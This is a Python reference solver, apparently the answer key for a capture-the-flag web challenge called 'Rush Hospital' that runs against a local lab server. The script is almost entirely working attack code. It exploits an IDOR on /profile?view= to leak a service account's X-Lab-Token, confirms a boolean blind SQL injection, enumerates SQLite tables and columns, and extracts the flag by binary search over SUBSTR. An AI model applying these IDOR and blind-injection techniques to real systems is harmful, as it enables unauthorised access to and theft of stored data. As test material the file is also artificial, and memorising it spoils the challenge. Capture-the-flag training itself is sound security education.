"""Reference solver for Rush Hospital - chained IDOR + blind SQLi.

Steps:
1. Register a fresh user.
2. Confirm /api/labcheck without any header always reports TRUE (stub mode).
3. Notice About page references the lab.dev service account.
4. Use IDOR via /profile?view=lab.dev to leak the X-Lab-Token value.
5. Replay /api/labcheck with X-Lab-Token. Now FALSE / TRUE differs and
   confirms the boolean oracle is live.
6. Confirm injection with `'1'='1` vs `'1'='2`.
7. Enumerate sqlite_master to find the user-defined tables.
8. For each table, find the column that holds the HZU18 prefix.
9. Binary-search SUBSTR per position to extract the flag.
"""

from __future__ import annotations

import http.cookiejar
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request


BASE = "http://127.0.0.1:3011"
PRINTABLE_LO = 0x20
PRINTABLE_HI = 0x7E
MAX_FLAG_LEN = 64


def make_opener() -> urllib.request.OpenerDirector:
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post_form(opener, path: str, data: dict[str, str]) -> bytes:
    body = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with opener.open(req, timeout=10) as resp:
        return resp.read()


def get_html(opener, path: str) -> str:
    with opener.open(BASE + path, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="replace")


def get_pdf_text(opener, path: str, params: dict[str, str], headers: dict[str, str] | None = None) -> str:
    qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
    url = f"{BASE}{path}?{qs}"
    req = urllib.request.Request(url)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    with opener.open(req, timeout=10) as resp:
        body = resp.read()
    return body.decode("latin-1", errors="ignore")


def truth(opener, payload: str, token: str | None) -> bool:
    headers = {"X-Lab-Token": token} if token else None
    text = get_pdf_text(opener, "/api/labcheck", {"test_code": payload}, headers=headers)
    if "Match Found: TRUE" in text:
        return True
    if "Match Found: FALSE" in text:
        return False
    raise RuntimeError("could not infer boolean from PDF response")


def or_payload(condition_sql: str) -> str:
    return "ZZZ' OR (" + condition_sql + ")-- "


def leak_dev_token(opener, username: str) -> str:
    html = get_html(opener, f"/profile?view={username}")
    m = re.search(r"<strong>Audit Key:</strong>\s*<code>([^<]+)</code>", html)
    if not m:
        raise RuntimeError(f"no Audit Key field rendered for {username}")
    return m.group(1).strip()


def count_tables(opener, token: str) -> int:
    lo, hi = 0, 64
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        cond = (
            "(SELECT COUNT(*) FROM sqlite_master WHERE type='table' "
            "AND name NOT LIKE 'sqlite_%') >= " + str(mid)
        )
        if truth(opener, or_payload(cond), token):
            lo = mid
        else:
            hi = mid
    return lo


def get_table_name(opener, ordinal: int, token: str) -> str:
    name = []
    pos = 1
    while True:
        cond = (
            "length((SELECT name FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
            "ORDER BY name LIMIT 1 OFFSET " + str(ordinal - 1) + ")) >= " + str(pos)
        )
        if not truth(opener, or_payload(cond), token):
            break
        ch = bsearch_char(opener,
            "SUBSTR((SELECT name FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
            "ORDER BY name LIMIT 1 OFFSET " + str(ordinal - 1) + "), " + str(pos) + ", 1)",
            token)
        name.append(ch)
        pos += 1
        if pos > 64:
            break
    return "".join(name)


def bsearch_char(opener, expr: str, token: str) -> str:
    lo = PRINTABLE_LO
    hi = PRINTABLE_HI + 1
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        cond = "(" + expr + ") < CHAR(" + str(mid) + ")"
        if truth(opener, or_payload(cond), token):
            hi = mid
        else:
            lo = mid
    return chr(lo)


def discover_text_columns(opener, table: str, token: str) -> list[str]:
    cols = []
    n = 0
    while True:
        cond = (
            "(SELECT COUNT(*) FROM pragma_table_info('" + table + "')) > " + str(n)
        )
        if not truth(opener, or_payload(cond), token):
            break
        name = []
        pos = 1
        while True:
            cond_len = (
                "length((SELECT name FROM pragma_table_info('" + table
                + "') LIMIT 1 OFFSET " + str(n) + ")) >= " + str(pos)
            )
            if not truth(opener, or_payload(cond_len), token):
                break
            ch = bsearch_char(opener,
                "SUBSTR((SELECT name FROM pragma_table_info('" + table
                + "') LIMIT 1 OFFSET " + str(n) + "), " + str(pos) + ", 1)",
                token)
            name.append(ch)
            pos += 1
            if pos > 48:
                break
        cols.append("".join(name))
        n += 1
        if n > 32:
            break
    return cols


def find_flag_table(opener, table_names: list[str], token: str) -> tuple[str, str]:
    for tbl in table_names:
        cols = discover_text_columns(opener, tbl, token)
        for col in cols:
            cond = (
                "(SELECT SUBSTR(" + col + ",1,6) FROM " + tbl + " LIMIT 1) = 'HZU18{'"
            )
            if truth(opener, or_payload(cond), token):
                return tbl, col
    raise RuntimeError("no table with HZU18 prefix found")


def extract_flag(opener, table: str, col: str, token: str) -> str:
    chars = []
    for pos in range(1, MAX_FLAG_LEN + 1):
        cond = (
            "length((SELECT " + col + " FROM " + table + " LIMIT 1)) >= " + str(pos)
        )
        if not truth(opener, or_payload(cond), token):
            break
        ch = bsearch_char(opener,
            "SUBSTR((SELECT " + col + " FROM " + table + " LIMIT 1), " + str(pos) + ", 1)",
            token)
        chars.append(ch)
        sys.stdout.write(ch)
        sys.stdout.flush()
    print()
    return "".join(chars)


def main() -> int:
    opener = make_opener()
    username = "solver_" + secrets.token_hex(3)
    password = "Solv3r!" + secrets.token_hex(3)

    print(f"register {username}")
    post_form(
        opener,
        "/register",
        {"username": username, "password": password, "full_name": "Reference Solver"},
    )

    print("step 1: labcheck without token (stub mode = always TRUE)")
    assert truth(opener, "GLU", None), "GLU without token should be TRUE (stub)"
    assert truth(opener, "ZZZNOPE", None), "ZZZNOPE without token should also be TRUE (stub)"
    print("  no usable oracle without token")

    print("step 2: try common privileged usernames via /profile?view=")
    candidates = ["admin", "root", "lab.dev", "sysadmin", "system"]
    token = None
    found_user = None
    for candidate in candidates:
        try:
            token = leak_dev_token(opener, candidate)
            found_user = candidate
            break
        except RuntimeError:
            continue
    if not token:
        raise RuntimeError("could not find any user with a dev_token in profile")
    print(f"  IDOR succeeded on /profile?view={found_user}")
    print(f"  leaked X-Lab-Token: {token}")

    print("step 4: replay labcheck with header (real oracle now)")
    assert truth(opener, "GLU", token), "GLU with token should be TRUE"
    assert not truth(opener, "ZZZNOPE", token), "ZZZNOPE with token should be FALSE"
    print("  oracle live")

    print("step 5: confirm injection")
    assert truth(opener, "GLU' AND '1'='1", token), "tautology should hold"
    assert not truth(opener, "GLU' AND '1'='2", token), "contradiction should fail"

    print("step 6: enumerate user tables")
    n = count_tables(opener, token)
    print(f"  {n} tables")
    tables = []
    for i in range(1, n + 1):
        name = get_table_name(opener, i, token)
        print(f"  table {i}: {name}")
        tables.append(name)

    print("step 7: find flag table by HZU18 prefix")
    table, col = find_flag_table(opener, tables, token)
    print(f"  flag stored in {table}.{col}")

    print("step 8: extract")
    flag = extract_flag(opener, table, col, token)
    print("flag:", flag)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except urllib.error.URLError as e:
        print(f"connection error: {e}")
        sys.exit(2)
